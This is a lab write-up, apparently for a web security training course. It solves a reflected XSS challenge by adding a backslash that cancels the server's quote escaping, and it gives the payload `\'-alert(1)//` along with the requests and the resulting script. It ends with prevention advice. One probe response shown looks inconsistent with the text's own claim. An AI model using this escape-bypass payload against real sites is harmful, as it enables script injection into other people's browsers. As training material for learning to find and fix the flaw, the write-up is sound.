# Lab 19: Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped

**Goal**: Break out of a single-quoted JavaScript string to execute `alert(1)` when angle brackets (`<`, `>`) and double quotes (`"`) are HTML-encoded, and single quotes (`'`) are backslash-escaped.

This lab contains a reflected XSS vulnerability in the search feature. Input is reflected inside a single-quoted JavaScript string literal (`var searchTerms = '...'`). Angle brackets and double quotes are HTML-encoded, preventing tag breakouts (`</script>`). Single quotes are escaped with a backslash (`\'`), but raw backslashes (`\`) are **NOT** escaped!

---

## 🎯 Solution

1. Test single quote escaping in Burp Suite Repeater:
   ```javascript
   var searchTerms = 'test\'payload';
   ```
2. Test backslash escaping:
   ```javascript
   var searchTerms = 'test\payload';
   ```
   *Observe that backslashes `\` are not escaped!*
3. Inject a backslash before the single quote (`\'`) to neutralize the server's escape character:
   ```javascript
   \'-alert(1)//
   ```
4. Send the request to execute `alert(1)` upon page load.

![Lab 19 Backslash Quote Escape Payload](../../Image%20Asset/Cross-Site%20Scripting/Screenshot%202026-09-26%20174245.png)

---

## 🛠️ Step-by-Step Guide

### Step 1: Probe Reflection & Escaping Behavior
Submit a search query containing quotes and backslashes (`test\'`) in Burp Suite Repeater:

```http
GET /?search=test\' HTTP/2
Host: your-lab-id.web-security-academy.net
```

Inspect the response:

```javascript
var searchTerms = 'test\\\'';
```

- Angle brackets `<` and `>` become `&lt;` and `&gt;`.
- Double quotes `"` become `&quot;`.
- Single quotes `'` are prefixed with a backslash `\'`.
- **Key Observation**: Sending a literal backslash `\` is reflected as `\`, **without** being escaped as `\\`!

### Step 2: Neutralize the Server's Escape Character
If we send `\'`, the server prepends its own backslash before our single quote, yielding:

```javascript
\\\'
```

#### Evaluation Analysis:
1. Our injected `\` escapes the server's added `\`, forming `\\` (a literal backslash character in JavaScript).
2. The single quote `'` is now left **unescaped** in the JavaScript syntax!

### Step 3: Construct Payload
Using `\'-alert(1)//`, the rendered inline script becomes:

```javascript
var searchTerms = '\\'-alert(1)//';
trackSearch(searchTerms);
```

#### Syntax Execution Flow:
1. `'\\'` -> Valid single-quoted string containing a literal backslash `\`.
2. `- alert(1)` -> Subtract operator evaluates the `alert(1)` function.
3. `//` -> Comments out the remaining trailing single quote `'` and semicolon.

### Step 4: Verify Payload Execution
Load the URL in the browser:

```http
/?search=\'-alert(1)//
```

![Lab 19 Solved Confirmation](../../Image%20Asset/Cross-Site%20Scripting/Screenshot%202026-09-26%20174255.png)

> [!SUCCESS]
> **Lab Solved**: Successfully executed `alert(1)` by using a backslash to neutralize quote escaping!

---

## 💡 Key Takeaways: Backslash Escaping Bypasses

- **Backslash Neutralization**: When servers escape quotes (`' -> \'`) without escaping backslashes (`\ -> \\`), submitting `\` transforms `\'` into `\\'`, effectively neutralizing the escape character and preserving the quote token.
- **Strict Encoding Rules**: Proper string escaping must handle escape characters (`\`) before handling string delimiters (`'`, `"`).

---

## 🔒 Prevention

> [!TIP]
> 1. **Escape Backslashes First**: Always escape backslashes (`\` to `\\`) before escaping quote characters (`'` to `\'`).
> 2. **JSON Serialization**: Use `JSON.stringify()` to serialize server data passed into JavaScript variables.
